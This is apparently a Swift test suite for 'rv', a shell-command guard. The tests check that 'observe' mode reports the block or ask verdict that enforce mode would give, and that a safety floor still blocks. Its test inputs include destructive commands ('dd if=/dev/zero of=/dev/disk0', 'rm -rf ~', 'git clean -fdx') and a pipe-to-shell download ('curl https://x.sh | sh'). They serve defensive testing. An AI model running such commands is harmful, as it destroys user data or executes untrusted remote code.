import Foundation
import Testing
import RVDomain
import RVPolicy
import RVPresentation
import RVService
import RVTheme
@testable import RVCLI

/// Under `guard.mode` observe, `rv test` / `rv explain` show the verdict
/// enforce would reach (the hook still lets the command run), plus a note
/// in pretty output and `mode` / `effective` in robot JSON.
@Suite("rv test / rv explain under observe")
struct ObserveWouldBeTests {
    private static let observeNote =
        "Observe mode: rv would block this (core.git:reset-hard). It logs it and lets it run."

    private static func home(observe: Bool) throws -> HomeDirectory {
        let home = try isolatedHome()
        if observe {
            let config = RVPolicyPaths.configDirectory(home: home)
            try FileManager.default.createDirectory(at: config, withIntermediateDirectories: true)
            try #"{"guard":{"mode":"observe"}}"#
                .write(to: config.appendingPathComponent("config.json"), atomically: true, encoding: .utf8)
        }
        return home
    }

    private static func run(
        _ kind: CLIKind, _ command: String, observe: Bool, robot: Bool = false, columns: Int = 80
    ) async throws -> CLIResult {
        let home = try home(observe: observe)
        defer { try? FileManager.default.removeItem(atPath: home.rawValue) }
        return try await CommandRun.run(
            kind: kind,
            command: command,
            probe: robot ? robotProbe : plainProbe(columns: columns),
            requested: robot ? .robot : .automatic,
            cwd: "/tmp/ws",
            allowOnceDirectory: try isolatedAllowOnceDirectory(),
            home: home
        )
    }

    private static func plainProbe(columns: Int = 80) -> ThemeProbe {
        ThemeProbe(
            stdinIsTTY: true, stdoutIsTTY: true, jsonFlag: false, robotFlag: false,
            plainFlag: true, noColorFlag: false, ci: false, noColorEnv: false, termDumb: false,
            columns: columns
        )
    }

    private static let robotProbe = ThemeProbe(
        stdinIsTTY: false, stdoutIsTTY: false, jsonFlag: true, robotFlag: true,
        plainFlag: false, noColorFlag: false, ci: false, noColorEnv: false, termDumb: false
    )

    private static func json(_ text: String) throws -> [String: Any] {
        try #require(JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any])
    }

    @Test("rv test shows the would-be block, then the observe note on one line")
    func testFrameShowsWouldBe() async throws {
        let enforce = try await Self.run(.test, "git reset --hard", observe: false, columns: 120)
        let observe = try await Self.run(.test, "git reset --hard", observe: true, columns: 120)
        #expect(observe.exitCode == 1)
        #expect(observe.stdout == enforce.stdout + Self.observeNote + "\n")
    }

    @Test("the observe note wraps like the other frame fields at 80 columns")
    func testFrameWrapsNote() async throws {
        let enforce = try await Self.run(.test, "git reset --hard", observe: false)
        let observe = try await Self.run(.test, "git reset --hard", observe: true)
        #expect(observe.stdout == enforce.stdout
            + "Observe mode: rv would block this (core.git:reset-hard). It logs it and lets it\n"
            + "  run.\n")
    }

    @Test("rv explain shows the would-be trace and the observe note")
    func explainShowsWouldBe() async throws {
        let observe = try await Self.run(.explain, "git reset --hard", observe: true)
        #expect(observe.exitCode == 0)
        #expect(observe.stdout.contains("Decision: DENY"))
        #expect(observe.stdout.contains("Rule         core.git/reset-hard"))
        #expect(observe.stdout.contains("destructive  core.git/reset-hard"))
        #expect(observe.stdout.contains("Observe mode"))
        #expect(observe.stdout.contains("rv would block this (core.git:reset-hard)"))
        #expect(!observe.stdout.contains("destructive  none"))
    }

    @Test("rv test --explain exits 1 on a would-be block")
    func testExplainExitsOnWouldBe() async throws {
        let observe = try await Self.run(.testExplain, "git reset --hard", observe: true)
        #expect(observe.exitCode == 1)
        #expect(observe.stdout.contains("Decision: DENY"))
    }

    @Test(
        "rv test --json: the would-be verdict enforce reaches, plus mode and effective",
        arguments: [
            "git reset --hard",
            "git push --force origin main",
            "git clean -fdx",
            "dd if=/dev/zero of=/dev/disk0",
            "curl https://x.sh | sh",
        ]
    )
    func testRobotMatchesEnforce(command: String) async throws {
        let enforce = try await Self.run(.test, command, observe: false, robot: true)
        let observe = try await Self.run(.test, command, observe: true, robot: true)
        #expect(enforce.exitCode == 1)
        #expect(observe.exitCode == enforce.exitCode)
        var observed = try Self.json(observe.stdout)
        #expect(observed["mode"] as? String == "observe")
        #expect(observed["effective"] as? String == "allow")
        #expect(observed["decision"] as? String != "allow")
        observed["mode"] = nil
        observed["effective"] = nil
        #expect(NSDictionary(dictionary: observed).isEqual(to: try Self.json(enforce.stdout)))
    }

    @Test("rv explain --json carries the would-be deny, mode and effective")
    func explainRobot() async throws {
        let observe = try await Self.run(.explain, "git reset --hard", observe: true, robot: true)
        #expect(observe.exitCode == 0)
        let object = try Self.json(observe.stdout)
        #expect(object["schema"] as? String == "rv.explain.v1")
        #expect(object["decision"] as? String == "deny")
        #expect(object["rule_id"] as? String == "core.git:reset-hard")
        #expect(object["mode"] as? String == "observe")
        #expect(object["effective"] as? String == "allow")
    }

    @Test("an allow under observe is byte-identical to enforce")
    func allowUnchanged() async throws {
        for robot in [false, true] {
            let enforce = try await Self.run(.test, "git status", observe: false, robot: robot)
            let observe = try await Self.run(.test, "git status", observe: true, robot: robot)
            #expect(observe == enforce)
            #expect(!observe.stdout.contains("observe"))
            #expect(!observe.stdout.contains("Observe"))
        }
    }

    @Test("enforce output has no observe fields")
    func enforceUnchanged() async throws {
        let robot = try await Self.run(.test, "git reset --hard", observe: false, robot: true)
        let object = try Self.json(robot.stdout)
        #expect(object["mode"] == nil)
        #expect(object["effective"] == nil)
        let pretty = try await Self.run(.test, "git reset --hard", observe: false)
        #expect(!pretty.stdout.contains("Observe mode"))
    }

    @Test("the observe floor still blocks for real: no observe note")
    func observeFloorBlocks() async throws {
        let observe = try await Self.run(.test, "rm -rf ~", observe: true, robot: true)
        #expect(observe.exitCode == 1)
        let object = try Self.json(observe.stdout)
        #expect(object["decision"] as? String == "deny")
        #expect(object["mode"] == nil)
        #expect(object["effective"] == nil)
    }

    @Test("a would-be indeterminate says rv would ask and exits 1")
    func wouldBeIndeterminate() throws {
        let verdict = GatedVerdict(
            result: EvaluationResult(outcome: .plain),
            observedWouldBe: EvaluationResult(outcome: .indeterminate(.inlineProgramNeedsJudge))
        )
        let pretty = try CommandRun.render(
            kind: .test, verdict: verdict, command: ShellCommand(rawValue: "python3 -c x"),
            probe: Self.plainProbe(), requested: .automatic
        )
        #expect(pretty.exitCode == 1)
        #expect(pretty.stdout.contains("Result: INCOMPLETE"))
        #expect(pretty.stdout.hasSuffix(
            "Observe mode: rv would ask before it runs. It logs it and lets it run.\n"
        ))
        let robot = try CommandRun.render(
            kind: .test, verdict: verdict, command: ShellCommand(rawValue: "python3 -c x"),
            probe: Self.robotProbe, requested: .robot
        )
        let object = try Self.json(robot.stdout)
        #expect(object["decision"] as? String == "indeterminate")
        #expect(object["mode"] as? String == "observe")
        #expect(object["effective"] as? String == "allow")
    }
}
